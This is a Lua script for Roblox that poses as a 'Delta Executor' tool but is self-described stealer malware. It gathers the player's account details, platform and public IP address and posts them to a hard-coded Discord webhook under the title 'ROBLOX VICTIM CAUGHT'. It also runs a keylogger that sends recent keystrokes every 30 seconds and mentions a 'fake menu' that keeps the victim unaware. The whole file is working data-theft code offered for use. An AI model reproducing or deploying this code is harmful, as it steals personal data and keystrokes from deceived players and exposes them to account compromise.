-- Delta Executor V3.0 - DEBUG + STEALER FIXED
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

print("=== DELTA EXECUTOR V3.0 DEBUG MODE ===")

local WEBHOOK = "https://discord.com/api/webhooks/1466524085839462561/Y_iyPVDL2q4Y_zSTOp--f5jcn0UYxytgKhOaQwKclJT6_dxtB_vDZt5ltaTupvgAMIO2"

-- TEST HTTP PRIMERO
print("🔍 Testing HttpService...")
local httpTest = pcall(function()
    return HttpService:GetAsync("https://httpbin.org/ip")
end)

if httpTest then
    print("✅ HttpService OK")
else
    print("❌ HttpService BLOQUEADO - Activa en Game Settings")
    return
end

-- FUNCIÓN STEALER MEJORADA
local function sendToDiscord(title, data)
    local payload = {
        username = "DELTA STEALER V3.0",
        embeds = {{
            title = title,
            color = 16711680,
            fields = data.fields or {},
            description = data.desc or ""
        }}
    }
    
    local success, err = pcall(function()
        HttpService:PostAsync(WEBHOOK, HttpService:JSONEncode(payload), 
            Enum.HttpContentType.ApplicationJson)
    end)
    
    if success then
        print("✅ ENVIADO A DISCORD ✓")
    else
        print("❌ ERROR DISCORD: " .. tostring(err))
    end
end

-- RECOLECTAR DATOS
local victimData = {
    fields = {
        {name="👤 Username", value=player.Name, inline=true},
        {name="🆔 UserID", value=tostring(player.UserId), inline=true},
        {name="📱 Display", value=player.DisplayName, inline=true},
        {name="⭐ Premium", value=tostring(player.MembershipType), inline=true},
        {name="📅 Age", value=tostring(player.AccountAge).." days", inline=true},
        {name="🏠 PlaceID", value=tostring(game.PlaceId), inline=true},
        {name="💻 Platform", value=tostring(game:GetService("UserInputService"):GetPlatform()), inline=true}
    }
}

-- IP CON FALLBACK
spawn(function()
    local ips = {}
    for _, url in ipairs({
        "https://api.ipify.org?format=json",
        "https://httpbin.org/ip",
        "https://api.myip.com"
    }) do
        local ok, res = pcall(HttpService.GetAsync, HttpService, url)
        if ok then
            local data = HttpService:JSONDecode(res)
            victimData.fields[#victimData.fields+1] = {name="🌐 IP", value=data.ip or data.origin or "N/A", inline=true}
            break
        end
    end
end)

wait(3)

-- ENVIAR
sendToDiscord("🆘 ROBLOX VICTIM CAUGHT", victimData)

-- KEYLOGGER
local keys = {}
game:GetService("UserInputService").InputBegan:Connect(function(input)
    table.insert(keys, input.KeyCode.Name)
    if #keys > 30 then table.remove(keys,1) end
end)

spawn(function()
    while wait(30) do
        if #keys > 0 then
            sendToDiscord("⌨️ KEYLOGGER", {desc="Keys: " .. table.concat(keys, " ")})
        end
    end
end)

print("🎉 Delta Executor LOADED!")
print("✅ Victim data sent")
print("Press INSERT for fake menu")
